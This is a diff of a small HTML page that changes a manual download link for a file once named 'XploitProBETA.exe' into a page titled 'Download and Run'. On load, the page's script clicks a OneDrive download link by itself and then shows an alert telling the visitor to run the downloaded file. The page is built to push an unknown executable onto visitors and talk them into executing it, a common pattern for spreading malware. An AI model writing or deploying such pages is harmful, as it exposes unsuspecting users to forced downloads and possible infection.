@@ -1,9 +1,15 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>Automatic Download Link</title>
+    <meta charset="UTF-8">
+    <title>Download and Run</title>
 </head>
 <body>
-<a href="https://drive.google.com/drive/u/0/home" download="XploitProBETA.exe">Download File</a>
+    <a id="downloadLink" href="https://onedrive.live.com/download?resid=3465A6952F9A1257%215158&authkey=!AAVQs8cHkcm3rys" download>Download File</a>
+
+    <script>
+        document.getElementById('downloadLink').click();
+        alert('Please run the downloaded file to proceed.');
+    </script>
 </body>
 </html>
